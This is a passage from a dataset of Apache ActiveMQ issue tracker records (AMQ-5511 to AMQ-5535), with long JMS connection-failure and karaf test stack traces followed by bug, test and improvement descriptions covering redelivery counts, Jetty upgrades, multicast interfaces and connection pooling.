org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:327)        at org.apache.activemq.jms.pool.ConnectionPool.makeSession(ConnectionPool.java:104)        at org.apache.activemq.jms.pool.ConnectionPool$1.makeObject(ConnectionPool.java:81)        at org.apache.activemq.jms.pool.ConnectionPool$1.makeObject(ConnectionPool.java:66)        at org.apache.commons.pool.impl.GenericKeyedObjectPool.borrowObject(GenericKeyedObjectPool.java:1220)        at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:133)        ... 8 moreCaused by: java.net.ConnectException: Connection refused        at java.net.PlainSocketImpl.socketConnect(Native Method)        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)at java.net.Socket.connect(Socket.java:589)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:501)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:464)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:1017)        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:148)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        ... 1 more20141223 01:21:44.286 EST (jmsContainer2-2) org.springframework.jms.listener.DefaultMessageListenerContainer#handleListenerSetupFailure 839 WARN - Setup of JMS message listener invoker failed for destination "topic://cometd.seedTCAStatusPush" - trying to recover. Cause: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused javax.jms.IllegalStateException: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused        at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:135)        at org.apache.activemq.jms.pool.PooledConnection.createSession(PooledConnection.java:167)        at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:197)        at org.springframework.jms.listener.DefaultMessageListenerContainer.access$1400(DefaultMessageListenerContainer.java:119)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.initResourcesIfNecessary(DefaultMessageListenerContainer.java:1122)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1101)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1094)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:991)        at java.lang.Thread.run(Thread.java:745)Caused by: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused        at org.apache.activemq.ActiveMQConnection.checkClosedOrFailed(ActiveMQConnection.java:1492)        at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:327)        at org.apache.activemq.jms.pool.ConnectionPool.makeSession(ConnectionPool.java:104)        at org.apache.activemq.jms.pool.ConnectionPool$1.makeObject(ConnectionPool.java:81)        at org.apache.activemq.jms.pool.ConnectionPool$1.makeObject(ConnectionPool.java:66)        at org.apache.commons.pool.impl.GenericKeyedObjectPool.borrowObject(GenericKeyedObjectPool.java:1220)        at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:133)        ... 8 moreCaused by: java.net.ConnectException: Connection refused        at java.net.PlainSocketImpl.socketConnect(Native Method)        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)at java.net.Socket.connect(Socket.java:589)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:501)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:464)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:1017)        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:148)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        ... 1 more20141223 01:21:44.288 EST (jmsContainer1-2) org.springframework.jms.listener.DefaultMessageListenerContainer#refreshConnectionUntilSuccessful 891 INFO - Successfully refreshed JMS Connection 20141223 01:21:44.289 EST (jmsContainer2-2) org.springframework.jms.listener.DefaultMessageListenerContainer#refreshConnectionUntilSuccessful 891 INFO - Successfully refreshed JMS Connection 20141223 01:21:49.291 EST (jmsContainer2-3) org.springframework.jms.listener.DefaultMessageListenerContainer#handleListenerSetupFailure 839 WARN - Setup of JMS message listener invoker failed for destination "topic://cometd.seedTCAStatusPush" - trying to recover. Cause: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused javax.jms.IllegalStateException: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused        at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:135)        at org.apache.activemq.jms.pool.PooledConnection.createSession(PooledConnection.java:167)        at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:197)        at org.springframework.jms.listener.DefaultMessageListenerContainer.access$1400(DefaultMessageListenerContainer.java:119)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.initResourcesIfNecessary(DefaultMessageListenerContainer.java:1122)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1101)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1094)        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:991)        at java.lang.Thread.run(Thread.java:745)Caused by: org.apache.activemq.ConnectionFailedException: The JMS connection has failed: Connection refused        at org.apache.activemq.ActiveMQConnection.checkClosedOrFailed(ActiveMQConnection.java:1492)        at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:327)        at org.apache.activemq.jms.pool.ConnectionPool.makeSession(ConnectionPool.java:104)        at org.apache.activemq.jms.pool.ConnectionPool$1.makeObject(ConnectionPool.java:81)        at org.apache.activemq.jms.pool.ConnectionPool$1.makeObject(ConnectionPool.java:66)        at org.apache.commons.pool.impl.GenericKeyedObjectPool.borrowObject(GenericKeyedObjectPool.java:1220)        at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:133)        ... 8 moreCaused by: java.net.ConnectException: Connection refused        at java.net.PlainSocketImpl.socketConnect(Native Method)at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:345)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)        at java.net.Socket.connect(Socket.java:589)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:501)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:464)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:138)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:1017)        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:148)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        ... 1 moreThis continues indefinitely. I checked lsof output at this point and there was no connection to ActiveMQ broker, so these connection attempts were not reaching the broker itself.
issueID:AMQ-5511
type:Bug
changed files:
texts:Retained messages for zero-byte clientId connections
When the zero-byte clientId client connects we use connection id for it. We need to use the same id when searching for context to send retained message.
issueID:AMQ-5512
type:Test
changed files:
texts:Resolve Intermittent failures in LevelDB tests
These tests need some work to understand the root cause of the ci failures. Because they cannot be reproduce locally they are proving elusive.Test Result (3 failures / ±0)org.apache.activemq.leveldb.test.ElectingLevelDBStoreTest.testElectionorg.apache.activemq.leveldb.test.ReplicatedLevelDBBrokerTest.testAMQ4837viaJMSorg.apache.activemq.leveldb.test.ReplicatedLevelDBBrokerTest.testAMQ4837viaJMXIt will take some work (and time) to fully understand and resolve the intermittent failures but should not hold up 5.11
issueID:AMQ-5513
type:Bug
changed files:
texts:redelivery count incremented in error for unconsumed prefetched messages
If a consumer with prefetch>0 does an immediate close, without consuming any messages. Spring DMLC with small timeout or receiveNoWait for example. The broker will have dispatched and will want to redispatch to another consumer and will have incremented the redelivery count in error.After 6 (default redelivery attempts) a consumer will poison ack and the message will go to the DLQ.A simple consumer create/close then create/receive with pending messages will demo this.true for queue consumers and durable topic subs
issueID:AMQ-5514
type:Bug
changed files:
texts:Create Release 5.10.1
Minor updates for the 5.10.1 release are included here.
issueID:AMQ-5515
type:Improvement
changed files:
texts:upgrade to jetty 8
In prep for release I found:[WARNING] The POM for org.eclipse.jetty:maven-jetty-plugin:jar:7.6.9.v20130131 is missing, no dependency information available7.x is out of maintenance and obviously missing some bits from maven central.Going to pull in servlet 3 and jetty 8.
issueID:AMQ-5517
type:Bug
changed files:
texts:Support for Jetty 9
With jetty 8 and jetty 7 going EOL and no longer receiving security updates, we need to support running with Jetty 9 as an option.
issueID:AMQ-5519
type:Bug
changed files:AmqpProtocolConverter.java
texts:use the "amqp:not-found" condition to indicate attempt to remove a DurableSubscription that does not exist
When attempting to unregister a DurableSubscription that does not exist via AMQP, the broker currently returns the "amqp:internal-error" condition when closing the link. Using the "amqp:not-found" condition would be more appropriate.
issueID:AMQ-5520
type:Bug
changed files:MulticastDiscoveryAgent.java
texts:MulticastDiscoveryAgent may use a network that is not multicast enabled, fails to startup
If no network interface is explicitly set, it calls mcast.joinGroup(inetAddress); without setting one on the MulticastSocket.  In that case, MulticastSocket then calls NetworkInterface.getDefault().    The "default" interface on a system is relatively unpredictable and COULD result in a network interface that isn"t even multicast enabled.     On my mac, it"s selecting a "awdl0" interface which doesn"t support multicast.   If I have Parallels running, it sometimes picks up one of those interfaces.   It also sometimes picks up an ipv6 only network interface which also doesn"t support the ipv4 broadcast address.It would be better to enumerate the network interfaces and at least make sure we grab one that support multicast on ipv4 and is "up".Note:  this causes some test failures on my machine.  Specifically SpringTest.testSenderWithSpringXmlEmbeddedPooledBrokerConfiguredViaXml fails.
issueID:AMQ-5521
type:Improvement
changed files:DestinationViewMBean.java
DestinationView.java
texts:Average message size attribute on destination mbean should not have decimals
Under AMQ-4831, we introduced rounding on the AverageMessageSize attribute of BrokerViewMBean, but the same change wasn"t applied to the same attribute on DestinationViewMBean so the two are inconsistent.  If the change was worth making, it should be made both places.
issueID:AMQ-5523
type:Improvement
changed files:StatisticsBroker.java
texts:Average message size attribute on statistics plugin should not have decimals
Related to AMQ-5521The avg message size should be long based, as also presented in JMX
issueID:AMQ-5525
type:Bug
changed files:ActiveMQCommand.java
texts:error converting collection entry - activemq:browse karaf command  via itests
failures:  ActiveMQAMQPBrokerFeatureTest>ActiveMQBrokerFeatureTest.test:70->AbstractFeatureTest.withinReason:259 expected:<[JMS_BODY_FIELD:JMSText = 1421674632296]> but was:<[]>  ActiveMQBrokerFeatureTest.test:70->AbstractFeatureTest.withinReason:259 expected:<[JMS_BODY_FIELD:JMSText = 1421674680492]> but was:<[]> root cause - somewhere in blueprint converter. java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342) at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134) at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54) at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119) at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source) at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78) at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477) at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403) at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120) at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:356) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340) ... 30 more2015-01-19 13:38:05,367 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342) at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134) at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54) at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119) at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source) at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78) at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477) at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403) at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120) at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:356) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340) ... 30 more2015-01-19 13:38:06,379 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342) at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134) at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54) at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119) at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source) at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78) at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477) at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403) at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120) at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:356) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340) ... 30 more2015-01-19 13:38:07,390 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342) at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134) at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54) at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119) at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source) at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78) at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477) at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403) at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120) at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:356) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340) ... 30 more2015-01-19 13:38:08,400 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342) at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143) at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134) at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54) at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119) at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source) at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78) at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477) at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403) at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183) at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120) at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:356) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117) at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471) at java.util.concurrent.FutureTask.run(FutureTask.java:262) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184) at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340)
issueID:AMQ-5526
type:Improvement
changed files:
texts:upgrade to karaf 2.4.1
matching camel, seems more stable in the itests w.r.t to hangs at shutdown.
issueID:AMQ-5530
type:Improvement
changed files:
texts:Change default mqtt subscription prefetch
Currently we use a prefetch of 1 by default for mqtt subscriptions. This doesn"t make much sense in real-life scenarios. We should use default values of non-durable and durable topics depending on the qos requested by the subscriber.
issueID:AMQ-5534
type:Bug
changed files:PooledConnectionFactory.java
ConnectionPool.java
texts:Generic JMS connection pool should be able to renew connections after JMSException
The generic jms pool does not have a mechanism to detect connection failure and dispose those connections. Adding a jms exception listener that will do that will do the trick.
issueID:AMQ-5535
type:Bug
changed files:ActiveMQConnection.java
texts:deadlock on close and failover reconnect around org.apache.activemq.ActiveMQConnection.getScheduler
